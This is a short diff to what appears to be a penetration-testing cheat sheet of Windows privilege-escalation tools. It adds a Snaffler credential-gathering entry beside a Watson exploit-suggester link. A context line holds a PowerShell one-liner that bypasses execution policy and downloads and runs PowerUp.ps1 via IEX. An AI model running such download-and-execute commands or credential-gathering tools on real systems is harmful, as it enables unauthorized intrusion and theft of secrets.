@@ -3,6 +3,10 @@
 ## Powerup
 powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 
+## Snaffler
+Credential gathering tool
+https://github.com/SnaffCon/Snaffler
+
 ## Waston
 Missing KBs and suggest exploit for PE
 https://github.com/rasta-mouse/Watson
